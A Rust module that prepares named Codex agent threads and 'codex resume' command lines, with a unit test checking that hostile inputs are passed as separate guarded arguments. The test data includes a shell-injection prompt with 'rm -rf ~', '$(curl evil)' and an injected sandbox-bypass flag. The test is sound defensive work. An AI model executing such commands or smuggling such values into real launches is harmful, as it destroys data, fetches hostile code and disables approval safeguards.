//! Creates named Codex threads and prepares resume launches.

use pwf_application::{
    ports::agent::PreparedAgentLaunch,
    task::session::{AgentLaunch, AgentProbe},
};

use super::{
    super::{
        codex_app_server::{CodexThreadPreparationError, start_and_name_thread},
        codex_reasoning_effort::CodexReasoningEffort,
    },
    argv::LaunchArgv,
};

const BINARY: &str = "codex";
const THREAD_ID_PREVIEW: &str = "<thread-id returned by thread/start>";

struct CodexLaunchPlan {
    title: String,
    repository: String,
    model: Option<String>,
    effort: CodexReasoningEffort,
    prompt: String,
}

impl From<&AgentLaunch> for CodexLaunchPlan {
    fn from(launch: &AgentLaunch) -> Self {
        Self {
            title: launch.title.clone(),
            repository: launch.repository.clone(),
            model: launch.model.clone(),
            effort: launch.effort.into(),
            prompt: launch.prompt.clone(),
        }
    }
}

pub(super) fn probe() -> AgentProbe {
    super::probe(BINARY)
}

pub(super) fn preview(launch: &AgentLaunch) -> Vec<String> {
    let plan = CodexLaunchPlan::from(launch);
    resume_argv(plan, THREAD_ID_PREVIEW.to_string())
}

pub(super) fn prepare(
    launch: &AgentLaunch,
) -> Result<PreparedAgentLaunch, CodexThreadPreparationError> {
    prepare_with_binary(launch, BINARY)
}

fn prepare_with_binary(
    launch: &AgentLaunch,
    app_server_binary: &str,
) -> Result<PreparedAgentLaunch, CodexThreadPreparationError> {
    let plan = CodexLaunchPlan::from(launch);
    let named_thread = start_and_name_thread(
        app_server_binary,
        &plan.title,
        &plan.repository,
        plan.model.as_deref(),
        plan.effort,
    )?;
    let thread_id = named_thread.into_id();
    let arguments = resume_argv(plan, thread_id.clone());
    Ok(PreparedAgentLaunch::NamedThread {
        arguments,
        thread_id,
    })
}

fn resume_argv(plan: CodexLaunchPlan, thread_id: String) -> Vec<String> {
    let mut argv = LaunchArgv::new(BINARY).positional("resume");
    if let Some(model) = plan.model {
        argv = argv.flag("--model", model);
    }
    argv = argv.flag(
        "-c",
        format!("model_reasoning_effort=\"{}\"", plan.effort.as_str()),
    );
    argv.positional(thread_id).into_guarded(plan.prompt)
}

#[cfg(test)]
mod tests {
    use pwf_application::{ports::agent::PreparedAgentLaunch, task::session::AgentLaunch};
    use pwf_models::session::{Agent, SessionEffort};

    use super::prepare_with_binary;
    #[cfg(unix)]
    use crate::session::codex_app_server::{AppServerFixture, OWNED_THREAD_ID};

    #[test]
    #[cfg(unix)]
    fn prepares_named_id_model_and_hostile_values_as_separate_arguments() {
        let fixture = AppServerFixture::successful();
        let launch = AgentLaunch {
            agent: Agent::Codex,
            task_id: "PWF-0068".to_string(),
            title: "\"; thread/delete everything".to_string(),
            repository: "/repo".to_string(),
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
                .to_string(),
            model: Some("gpt-8-billion".to_string()),
            effort: SessionEffort::Max,
        };

        let prepared = prepare_with_binary(&launch, fixture.binary.to_str().unwrap()).unwrap();
        let PreparedAgentLaunch::NamedThread {
            arguments,
            thread_id,
        } = prepared
        else {
            panic!("Codex preparation must preserve its named thread")
        };

        assert_eq!(
            arguments,
            [
                "codex",
                "resume",
                "--model",
                "gpt-8-billion",
                "-c",
                "model_reasoning_effort=\"max\"",
                OWNED_THREAD_ID,
                "--",
                "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox",
            ]
        );
        assert_eq!(thread_id, OWNED_THREAD_ID);
        let requests = fixture.requests();
        assert_eq!(requests[2]["params"]["cwd"], "/repo");
        assert_eq!(requests[2]["params"]["model"], "gpt-8-billion");
        assert_eq!(
            requests[2]["params"]["config"]["model_reasoning_effort"],
            "max"
        );
        assert_eq!(
            requests[3]["params"]["name"],
            "\"; thread/delete everything"
        );
    }
}
